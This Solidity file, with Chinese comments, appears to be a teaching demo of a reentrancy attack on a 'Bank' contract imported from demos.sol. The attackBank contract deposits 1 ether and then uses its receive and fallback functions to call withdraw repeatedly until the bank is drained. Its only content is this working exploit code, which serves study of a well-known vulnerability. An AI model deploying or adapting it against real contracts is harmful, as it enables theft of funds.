// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./demos.sol";
// 对 Bank 合约进行重入攻击
contract attackBank {
    Bank public bank;

    constructor(address bank_addr) payable {
        bank = Bank(bank_addr);
    }
    receive() external payable {
        if (getBankBalance() >= 1 ether) {
            bank.withdraw();
        }
    }
    // 模拟重入攻击，利用fallback特性将Bank提空
    fallback() external payable {
        if (getBankBalance() >= 1 ether) {
            bank.withdraw();
        }
    }
    function attack() public payable {
       if (getBankBalance() >= 1 ether) {
            bank.deposit{value: 1 ether}(); // 存入1次
            bank.withdraw();
        }
    }

    function getBankBalance() public view returns(uint256){
        return address(bank).balance;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
}
